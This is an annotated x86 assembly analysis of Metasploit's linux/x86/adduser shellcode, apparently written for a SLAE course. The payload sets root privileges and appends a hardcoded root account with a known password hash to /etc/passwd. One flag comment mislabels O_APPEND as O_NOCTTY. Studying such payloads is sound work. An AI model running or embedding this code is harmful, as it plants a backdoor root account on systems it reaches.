; Metasploit linux/x86/adduser
; Analysis by Guillaume Kaddouch
; SLAE-681

global _start

section .text

_start:

	; set current user id to 0 (= root)
	; int setreuid(uid_t ruid, uid_t euid)

	xor ecx,ecx		; 2nd arg: euid = 0
	mov ebx,ecx		; 1st arg: ruid = 0
	push byte +0x46		; push 70 = setreuid()
	pop eax			; pop 70 into eax
	int 0x80		; eax = setreuid(0, 0), on success 0 is returned


	; open /etc/passwd file
	; int open(const char *pathname, int flags)

	push byte +0x5		; push 5 = open()
	pop eax			; pop 5 into eax
	xor ecx,ecx		; zero out ecx
	push ecx		; push 0x00000000 on stack to NULL terminate the following string
	push dword 0x64777373	; string 'dwss' (decoded with hex2string.py)
	push dword 0x61702f2f	; string 'ap//'
	push dword 0x6374652f	; string 'cte/' -> whole string = /etc//passwd
	mov ebx,esp		; 1st arg: ebx = string address
	inc ecx			; ecx = 0x00000001 = O_WRONLY (Write Only)
	mov ch,0x4		; 2nd arg: ecx = 0x00000401 = O_NOCTTY
	int 0x80		; eax = open(*/etc/passwd, O_WRONLY+O_NOCTTY), fd returned into eax

	xchg eax,ebx		; save fd into ebx, set eax = */etc/passwd

	; All asm below is misinterpreted by nasm
	; it is not assembly, but in reality the line to add to /etc/passwd in the form
	; user:encrypted_password:0:0::/:/bin/sh
	call next		; \xe8\x22 = call 0x22 = 34 (string lenght)
				; jump ahead of the string to the rest of code

	; passwd line to add
	jnc 0x99
	popad
	cmp al,[gs:ecx+0x7a]
	aaa
	cs push edi
	dec edx
	fs push dword 0x73642e47
	cmp dh,[eax]
	cmp dh,[eax]
	cmp bh,[edx]
	das
	cmp ch,[edi]
	bound ebp,[ecx+0x6e]
	das
	jnc 0xb4
	or bl,[ecx-0x75]		; 0A598B: one byte belongs to the string (0x0A)

	; original shellcode chunk
	; \x73\x6c\x61\x65\x3a\x41\x7a\x37\x2e\x57\x4a\x2e\x64\x68\x47\x2e\x64\x73\x3a
	; \x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x73\x68\x0a

	; stripping '\x' with : echo [shellcode chunk] | sed 's/\\//g' | sed 's/x//g'

	; using ./hex2reversestring.py 736c61653a417a372e574a2e6468472e64733a303a303a3a2f3a2f62696e2f73680a
	; = slae:Az7.WJ.dhG.ds:0:0::/:/bin/sh

	; call above continues below
next:
	; writing to /etc/passwd
	;  ssize_t write(int fd, const void *buf, size_t count);
	; 1st arg: ebx = fd

	pop ecx				; retrieve the address of the begining of user line to add to passwd
					; 2nd arg: *buf
	mov edx, dword [ecx-4]		; 3rd arg: size is at the begining of the line string. See below

					; E8 22 00 00 00	call 0x22
					; 73 <- ret = ecx
					; ecx-4 = 73(0) 00(1) 00(2) 00(3) 22(4) = 34 bytes

	push byte 0x4			; 0x4 = write()
	pop eax				; prepare syscall
	int 0x80			; write(fd, *slae:Az7.WJ.dhG.ds:0:0::/:/bin/sh, 33) 

	push byte 0x1			; 0x1 = exit()
	pop eax				; prepare syscall
	int 0x80			; exit()
